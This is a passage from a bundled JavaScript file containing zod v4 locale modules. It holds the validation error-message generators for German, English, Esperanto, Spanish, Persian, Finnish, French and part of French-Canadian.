          return `Ung\xFCltige Eingabe: erwartet instanceof ${issue2.expected}, erhalten ${received}`;
        }
        return `Ung\xFCltige Eingabe: erwartet ${expected}, erhalten ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Ung\xFCltige Eingabe: erwartet ${stringifyPrimitive(issue2.values[0])}`;
        return `Ung\xFCltige Option: erwartet eine von ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Zu gro\xDF: erwartet, dass ${issue2.origin ?? "Wert"} ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "Elemente"} hat`;
        return `Zu gro\xDF: erwartet, dass ${issue2.origin ?? "Wert"} ${adj}${issue2.maximum.toString()} ist`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Zu klein: erwartet, dass ${issue2.origin} ${adj}${issue2.minimum.toString()} ${sizing.unit} hat`;
        }
        return `Zu klein: erwartet, dass ${issue2.origin} ${adj}${issue2.minimum.toString()} ist`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Ung\xFCltiger String: muss mit "${_issue.prefix}" beginnen`;
        if (_issue.format === "ends_with")
          return `Ung\xFCltiger String: muss mit "${_issue.suffix}" enden`;
        if (_issue.format === "includes")
          return `Ung\xFCltiger String: muss "${_issue.includes}" enthalten`;
        if (_issue.format === "regex")
          return `Ung\xFCltiger String: muss dem Muster ${_issue.pattern} entsprechen`;
        return `Ung\xFCltig: ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Ung\xFCltige Zahl: muss ein Vielfaches von ${issue2.divisor} sein`;
      case "unrecognized_keys":
        return `${issue2.keys.length > 1 ? "Unbekannte Schl\xFCssel" : "Unbekannter Schl\xFCssel"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Ung\xFCltiger Schl\xFCssel in ${issue2.origin}`;
      case "invalid_union":
        return "Ung\xFCltige Eingabe";
      case "invalid_element":
        return `Ung\xFCltiger Wert in ${issue2.origin}`;
      default:
        return `Ung\xFCltige Eingabe`;
    }
  };
};
function de_default() {
  return {
    localeError: error8()
  };
}
// node_modules/zod/v4/locales/en.js
var error9 = () => {
  const Sizable = {
    string: { unit: "characters", verb: "to have" },
    file: { unit: "bytes", verb: "to have" },
    array: { unit: "items", verb: "to have" },
    set: { unit: "items", verb: "to have" },
    map: { unit: "entries", verb: "to have" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "input",
    email: "email address",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO datetime",
    date: "ISO date",
    time: "ISO time",
    duration: "ISO duration",
    ipv4: "IPv4 address",
    ipv6: "IPv6 address",
    mac: "MAC address",
    cidrv4: "IPv4 range",
    cidrv6: "IPv6 range",
    base64: "base64-encoded string",
    base64url: "base64url-encoded string",
    json_string: "JSON string",
    e164: "E.164 number",
    jwt: "JWT",
    template_literal: "input"
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        return `Invalid input: expected ${expected}, received ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Invalid input: expected ${stringifyPrimitive(issue2.values[0])}`;
        return `Invalid option: expected one of ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Too big: expected ${issue2.origin ?? "value"} to have ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elements"}`;
        return `Too big: expected ${issue2.origin ?? "value"} to be ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Too small: expected ${issue2.origin} to have ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Too small: expected ${issue2.origin} to be ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `Invalid string: must start with "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Invalid string: must end with "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Invalid string: must include "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Invalid string: must match pattern ${_issue.pattern}`;
        return `Invalid ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Invalid number: must be a multiple of ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Unrecognized key${issue2.keys.length > 1 ? "s" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Invalid key in ${issue2.origin}`;
      case "invalid_union":
        return "Invalid input";
      case "invalid_element":
        return `Invalid value in ${issue2.origin}`;
      default:
        return `Invalid input`;
    }
  };
};
function en_default() {
  return {
    localeError: error9()
  };
}
// node_modules/zod/v4/locales/eo.js
var error10 = () => {
  const Sizable = {
    string: { unit: "karaktrojn", verb: "havi" },
    file: { unit: "bajtojn", verb: "havi" },
    array: { unit: "elementojn", verb: "havi" },
    set: { unit: "elementojn", verb: "havi" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "enigo",
    email: "retadreso",
    url: "URL",
    emoji: "emo\u011Dio",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO-datotempo",
    date: "ISO-dato",
    time: "ISO-tempo",
    duration: "ISO-da\u016Dro",
    ipv4: "IPv4-adreso",
    ipv6: "IPv6-adreso",
    cidrv4: "IPv4-rango",
    cidrv6: "IPv6-rango",
    base64: "64-ume kodita karaktraro",
    base64url: "URL-64-ume kodita karaktraro",
    json_string: "JSON-karaktraro",
    e164: "E.164-nombro",
    jwt: "JWT",
    template_literal: "enigo"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "nombro",
    array: "tabelo",
    null: "senvalora"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Nevalida enigo: atendi\u011Dis instanceof ${issue2.expected}, ricevi\u011Dis ${received}`;
        }
        return `Nevalida enigo: atendi\u011Dis ${expected}, ricevi\u011Dis ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Nevalida enigo: atendi\u011Dis ${stringifyPrimitive(issue2.values[0])}`;
        return `Nevalida opcio: atendi\u011Dis unu el ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Tro granda: atendi\u011Dis ke ${issue2.origin ?? "valoro"} havu ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elementojn"}`;
        return `Tro granda: atendi\u011Dis ke ${issue2.origin ?? "valoro"} havu ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Tro malgranda: atendi\u011Dis ke ${issue2.origin} havu ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Tro malgranda: atendi\u011Dis ke ${issue2.origin} estu ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Nevalida karaktraro: devas komenci\u011Di per "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Nevalida karaktraro: devas fini\u011Di per "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Nevalida karaktraro: devas inkluzivi "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Nevalida karaktraro: devas kongrui kun la modelo ${_issue.pattern}`;
        return `Nevalida ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Nevalida nombro: devas esti oblo de ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Nekonata${issue2.keys.length > 1 ? "j" : ""} \u015Dlosilo${issue2.keys.length > 1 ? "j" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Nevalida \u015Dlosilo en ${issue2.origin}`;
      case "invalid_union":
        return "Nevalida enigo";
      case "invalid_element":
        return `Nevalida valoro en ${issue2.origin}`;
      default:
        return `Nevalida enigo`;
    }
  };
};
function eo_default() {
  return {
    localeError: error10()
  };
}
// node_modules/zod/v4/locales/es.js
var error11 = () => {
  const Sizable = {
    string: { unit: "caracteres", verb: "tener" },
    file: { unit: "bytes", verb: "tener" },
    array: { unit: "elementos", verb: "tener" },
    set: { unit: "elementos", verb: "tener" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "entrada",
    email: "direcci\xF3n de correo electr\xF3nico",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "fecha y hora ISO",
    date: "fecha ISO",
    time: "hora ISO",
    duration: "duraci\xF3n ISO",
    ipv4: "direcci\xF3n IPv4",
    ipv6: "direcci\xF3n IPv6",
    cidrv4: "rango IPv4",
    cidrv6: "rango IPv6",
    base64: "cadena codificada en base64",
    base64url: "URL codificada en base64",
    json_string: "cadena JSON",
    e164: "n\xFAmero E.164",
    jwt: "JWT",
    template_literal: "entrada"
  };
  const TypeDictionary = {
    nan: "NaN",
    string: "texto",
    number: "n\xFAmero",
    boolean: "booleano",
    array: "arreglo",
    object: "objeto",
    set: "conjunto",
    file: "archivo",
    date: "fecha",
    bigint: "n\xFAmero grande",
    symbol: "s\xEDmbolo",
    undefined: "indefinido",
    null: "nulo",
    function: "funci\xF3n",
    map: "mapa",
    record: "registro",
    tuple: "tupla",
    enum: "enumeraci\xF3n",
    union: "uni\xF3n",
    literal: "literal",
    promise: "promesa",
    void: "vac\xEDo",
    never: "nunca",
    unknown: "desconocido",
    any: "cualquiera"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Entrada inv\xE1lida: se esperaba instanceof ${issue2.expected}, recibido ${received}`;
        }
        return `Entrada inv\xE1lida: se esperaba ${expected}, recibido ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Entrada inv\xE1lida: se esperaba ${stringifyPrimitive(issue2.values[0])}`;
        return `Opci\xF3n inv\xE1lida: se esperaba una de ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        const origin = TypeDictionary[issue2.origin] ?? issue2.origin;
        if (sizing)
          return `Demasiado grande: se esperaba que ${origin ?? "valor"} tuviera ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elementos"}`;
        return `Demasiado grande: se esperaba que ${origin ?? "valor"} fuera ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        const origin = TypeDictionary[issue2.origin] ?? issue2.origin;
        if (sizing) {
          return `Demasiado peque\xF1o: se esperaba que ${origin} tuviera ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Demasiado peque\xF1o: se esperaba que ${origin} fuera ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Cadena inv\xE1lida: debe comenzar con "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Cadena inv\xE1lida: debe terminar en "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Cadena inv\xE1lida: debe incluir "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Cadena inv\xE1lida: debe coincidir con el patr\xF3n ${_issue.pattern}`;
        return `Inv\xE1lido ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `N\xFAmero inv\xE1lido: debe ser m\xFAltiplo de ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Llave${issue2.keys.length > 1 ? "s" : ""} desconocida${issue2.keys.length > 1 ? "s" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Llave inv\xE1lida en ${TypeDictionary[issue2.origin] ?? issue2.origin}`;
      case "invalid_union":
        return "Entrada inv\xE1lida";
      case "invalid_element":
        return `Valor inv\xE1lido en ${TypeDictionary[issue2.origin] ?? issue2.origin}`;
      default:
        return `Entrada inv\xE1lida`;
    }
  };
};
function es_default() {
  return {
    localeError: error11()
  };
}
// node_modules/zod/v4/locales/fa.js
var error12 = () => {
  const Sizable = {
    string: { unit: "\u06A9\u0627\u0631\u0627\u06A9\u062A\u0631", verb: "\u062F\u0627\u0634\u062A\u0647 \u0628\u0627\u0634\u062F" },
    file: { unit: "\u0628\u0627\u06CC\u062A", verb: "\u062F\u0627\u0634\u062A\u0647 \u0628\u0627\u0634\u062F" },
    array: { unit: "\u0622\u06CC\u062A\u0645", verb: "\u062F\u0627\u0634\u062A\u0647 \u0628\u0627\u0634\u062F" },
    set: { unit: "\u0622\u06CC\u062A\u0645", verb: "\u062F\u0627\u0634\u062A\u0647 \u0628\u0627\u0634\u062F" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0648\u0631\u0648\u062F\u06CC",
    email: "\u0622\u062F\u0631\u0633 \u0627\u06CC\u0645\u06CC\u0644",
    url: "URL",
    emoji: "\u0627\u06CC\u0645\u0648\u062C\u06CC",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u062A\u0627\u0631\u06CC\u062E \u0648 \u0632\u0645\u0627\u0646 \u0627\u06CC\u0632\u0648",
    date: "\u062A\u0627\u0631\u06CC\u062E \u0627\u06CC\u0632\u0648",
    time: "\u0632\u0645\u0627\u0646 \u0627\u06CC\u0632\u0648",
    duration: "\u0645\u062F\u062A \u0632\u0645\u0627\u0646 \u0627\u06CC\u0632\u0648",
    ipv4: "IPv4 \u0622\u062F\u0631\u0633",
    ipv6: "IPv6 \u0622\u062F\u0631\u0633",
    cidrv4: "IPv4 \u062F\u0627\u0645\u0646\u0647",
    cidrv6: "IPv6 \u062F\u0627\u0645\u0646\u0647",
    base64: "base64-encoded \u0631\u0634\u062A\u0647",
    base64url: "base64url-encoded \u0631\u0634\u062A\u0647",
    json_string: "JSON \u0631\u0634\u062A\u0647",
    e164: "E.164 \u0639\u062F\u062F",
    jwt: "JWT",
    template_literal: "\u0648\u0631\u0648\u062F\u06CC"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0639\u062F\u062F",
    array: "\u0622\u0631\u0627\u06CC\u0647"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u0648\u0631\u0648\u062F\u06CC \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0645\u06CC\u200C\u0628\u0627\u06CC\u0633\u062A instanceof ${issue2.expected} \u0645\u06CC\u200C\u0628\u0648\u062F\u060C ${received} \u062F\u0631\u06CC\u0627\u0641\u062A \u0634\u062F`;
        }
        return `\u0648\u0631\u0648\u062F\u06CC \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0645\u06CC\u200C\u0628\u0627\u06CC\u0633\u062A ${expected} \u0645\u06CC\u200C\u0628\u0648\u062F\u060C ${received} \u062F\u0631\u06CC\u0627\u0641\u062A \u0634\u062F`;
      }
      case "invalid_value":
        if (issue2.values.length === 1) {
          return `\u0648\u0631\u0648\u062F\u06CC \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0645\u06CC\u200C\u0628\u0627\u06CC\u0633\u062A ${stringifyPrimitive(issue2.values[0])} \u0645\u06CC\u200C\u0628\u0648\u062F`;
        }
        return `\u06AF\u0632\u06CC\u0646\u0647 \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0645\u06CC\u200C\u0628\u0627\u06CC\u0633\u062A \u06CC\u06A9\u06CC \u0627\u0632 ${joinValues(issue2.values, "|")} \u0645\u06CC\u200C\u0628\u0648\u062F`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u062E\u06CC\u0644\u06CC \u0628\u0632\u0631\u06AF: ${issue2.origin ?? "\u0645\u0642\u062F\u0627\u0631"} \u0628\u0627\u06CC\u062F ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\u0639\u0646\u0635\u0631"} \u0628\u0627\u0634\u062F`;
        }
        return `\u062E\u06CC\u0644\u06CC \u0628\u0632\u0631\u06AF: ${issue2.origin ?? "\u0645\u0642\u062F\u0627\u0631"} \u0628\u0627\u06CC\u062F ${adj}${issue2.maximum.toString()} \u0628\u0627\u0634\u062F`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u062E\u06CC\u0644\u06CC \u06A9\u0648\u0686\u06A9: ${issue2.origin} \u0628\u0627\u06CC\u062F ${adj}${issue2.minimum.toString()} ${sizing.unit} \u0628\u0627\u0634\u062F`;
        }
        return `\u062E\u06CC\u0644\u06CC \u06A9\u0648\u0686\u06A9: ${issue2.origin} \u0628\u0627\u06CC\u062F ${adj}${issue2.minimum.toString()} \u0628\u0627\u0634\u062F`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\u0631\u0634\u062A\u0647 \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0628\u0627\u06CC\u062F \u0628\u0627 "${_issue.prefix}" \u0634\u0631\u0648\u0639 \u0634\u0648\u062F`;
        }
        if (_issue.format === "ends_with") {
          return `\u0631\u0634\u062A\u0647 \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0628\u0627\u06CC\u062F \u0628\u0627 "${_issue.suffix}" \u062A\u0645\u0627\u0645 \u0634\u0648\u062F`;
        }
        if (_issue.format === "includes") {
          return `\u0631\u0634\u062A\u0647 \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0628\u0627\u06CC\u062F \u0634\u0627\u0645\u0644 "${_issue.includes}" \u0628\u0627\u0634\u062F`;
        }
        if (_issue.format === "regex") {
          return `\u0631\u0634\u062A\u0647 \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0628\u0627\u06CC\u062F \u0628\u0627 \u0627\u0644\u06AF\u0648\u06CC ${_issue.pattern} \u0645\u0637\u0627\u0628\u0642\u062A \u062F\u0627\u0634\u062A\u0647 \u0628\u0627\u0634\u062F`;
        }
        return `${FormatDictionary[_issue.format] ?? issue2.format} \u0646\u0627\u0645\u0639\u062A\u0628\u0631`;
      }
      case "not_multiple_of":
        return `\u0639\u062F\u062F \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0628\u0627\u06CC\u062F \u0645\u0636\u0631\u0628 ${issue2.divisor} \u0628\u0627\u0634\u062F`;
      case "unrecognized_keys":
        return `\u06A9\u0644\u06CC\u062F${issue2.keys.length > 1 ? "\u0647\u0627\u06CC" : ""} \u0646\u0627\u0634\u0646\u0627\u0633: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u06A9\u0644\u06CC\u062F \u0646\u0627\u0634\u0646\u0627\u0633 \u062F\u0631 ${issue2.origin}`;
      case "invalid_union":
        return `\u0648\u0631\u0648\u062F\u06CC \u0646\u0627\u0645\u0639\u062A\u0628\u0631`;
      case "invalid_element":
        return `\u0645\u0642\u062F\u0627\u0631 \u0646\u0627\u0645\u0639\u062A\u0628\u0631 \u062F\u0631 ${issue2.origin}`;
      default:
        return `\u0648\u0631\u0648\u062F\u06CC \u0646\u0627\u0645\u0639\u062A\u0628\u0631`;
    }
  };
};
function fa_default() {
  return {
    localeError: error12()
  };
}
// node_modules/zod/v4/locales/fi.js
var error13 = () => {
  const Sizable = {
    string: { unit: "merkki\xE4", subject: "merkkijonon" },
    file: { unit: "tavua", subject: "tiedoston" },
    array: { unit: "alkiota", subject: "listan" },
    set: { unit: "alkiota", subject: "joukon" },
    number: { unit: "", subject: "luvun" },
    bigint: { unit: "", subject: "suuren kokonaisluvun" },
    int: { unit: "", subject: "kokonaisluvun" },
    date: { unit: "", subject: "p\xE4iv\xE4m\xE4\xE4r\xE4n" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "s\xE4\xE4nn\xF6llinen lauseke",
    email: "s\xE4hk\xF6postiosoite",
    url: "URL-osoite",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO-aikaleima",
    date: "ISO-p\xE4iv\xE4m\xE4\xE4r\xE4",
    time: "ISO-aika",
    duration: "ISO-kesto",
    ipv4: "IPv4-osoite",
    ipv6: "IPv6-osoite",
    cidrv4: "IPv4-alue",
    cidrv6: "IPv6-alue",
    base64: "base64-koodattu merkkijono",
    base64url: "base64url-koodattu merkkijono",
    json_string: "JSON-merkkijono",
    e164: "E.164-luku",
    jwt: "JWT",
    template_literal: "templaattimerkkijono"
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Virheellinen tyyppi: odotettiin instanceof ${issue2.expected}, oli ${received}`;
        }
        return `Virheellinen tyyppi: odotettiin ${expected}, oli ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Virheellinen sy\xF6te: t\xE4ytyy olla ${stringifyPrimitive(issue2.values[0])}`;
        return `Virheellinen valinta: t\xE4ytyy olla yksi seuraavista: ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Liian suuri: ${sizing.subject} t\xE4ytyy olla ${adj}${issue2.maximum.toString()} ${sizing.unit}`.trim();
        }
        return `Liian suuri: arvon t\xE4ytyy olla ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Liian pieni: ${sizing.subject} t\xE4ytyy olla ${adj}${issue2.minimum.toString()} ${sizing.unit}`.trim();
        }
        return `Liian pieni: arvon t\xE4ytyy olla ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Virheellinen sy\xF6te: t\xE4ytyy alkaa "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Virheellinen sy\xF6te: t\xE4ytyy loppua "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Virheellinen sy\xF6te: t\xE4ytyy sis\xE4lt\xE4\xE4 "${_issue.includes}"`;
        if (_issue.format === "regex") {
          return `Virheellinen sy\xF6te: t\xE4ytyy vastata s\xE4\xE4nn\xF6llist\xE4 lauseketta ${_issue.pattern}`;
        }
        return `Virheellinen ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Virheellinen luku: t\xE4ytyy olla luvun ${issue2.divisor} monikerta`;
      case "unrecognized_keys":
        return `${issue2.keys.length > 1 ? "Tuntemattomat avaimet" : "Tuntematon avain"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return "Virheellinen avain tietueessa";
      case "invalid_union":
        return "Virheellinen unioni";
      case "invalid_element":
        return "Virheellinen arvo joukossa";
      default:
        return `Virheellinen sy\xF6te`;
    }
  };
};
function fi_default() {
  return {
    localeError: error13()
  };
}
// node_modules/zod/v4/locales/fr.js
var error14 = () => {
  const Sizable = {
    string: { unit: "caract\xE8res", verb: "avoir" },
    file: { unit: "octets", verb: "avoir" },
    array: { unit: "\xE9l\xE9ments", verb: "avoir" },
    set: { unit: "\xE9l\xE9ments", verb: "avoir" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "entr\xE9e",
    email: "adresse e-mail",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "date et heure ISO",
    date: "date ISO",
    time: "heure ISO",
    duration: "dur\xE9e ISO",
    ipv4: "adresse IPv4",
    ipv6: "adresse IPv6",
    cidrv4: "plage IPv4",
    cidrv6: "plage IPv6",
    base64: "cha\xEEne encod\xE9e en base64",
    base64url: "cha\xEEne encod\xE9e en base64url",
    json_string: "cha\xEEne JSON",
    e164: "num\xE9ro E.164",
    jwt: "JWT",
    template_literal: "entr\xE9e"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "nombre",
    array: "tableau"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Entr\xE9e invalide : instanceof ${issue2.expected} attendu, ${received} re\xE7u`;
        }
        return `Entr\xE9e invalide : ${expected} attendu, ${received} re\xE7u`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Entr\xE9e invalide : ${stringifyPrimitive(issue2.values[0])} attendu`;
        return `Option invalide : une valeur parmi ${joinValues(issue2.values, "|")} attendue`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Trop grand : ${issue2.origin ?? "valeur"} doit ${sizing.verb} ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\xE9l\xE9ment(s)"}`;
        return `Trop grand : ${issue2.origin ?? "valeur"} doit \xEAtre ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Trop petit : ${issue2.origin} doit ${sizing.verb} ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Trop petit : ${issue2.origin} doit \xEAtre ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Cha\xEEne invalide : doit commencer par "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Cha\xEEne invalide : doit se terminer par "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Cha\xEEne invalide : doit inclure "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Cha\xEEne invalide : doit correspondre au mod\xE8le ${_issue.pattern}`;
        return `${FormatDictionary[_issue.format] ?? issue2.format} invalide`;
      }
      case "not_multiple_of":
        return `Nombre invalide : doit \xEAtre un multiple de ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Cl\xE9${issue2.keys.length > 1 ? "s" : ""} non reconnue${issue2.keys.length > 1 ? "s" : ""} : ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Cl\xE9 invalide dans ${issue2.origin}`;
      case "invalid_union":
        return "Entr\xE9e invalide";
      case "invalid_element":
        return `Valeur invalide dans ${issue2.origin}`;
      default:
        return `Entr\xE9e invalide`;
    }
  };
};
function fr_default() {
  return {
    localeError: error14()
  };
}
// node_modules/zod/v4/locales/fr-CA.js
var error15 = () => {
  const Sizable = {
    string: { unit: "caract\xE8res", verb: "avoir" },
    file: { unit: "octets", verb: "avoir" },
    array: { unit: "\xE9l\xE9ments", verb: "avoir" },
    set: { unit: "\xE9l\xE9ments", verb: "avoir" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "entr\xE9e",
    email: "adresse courriel",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
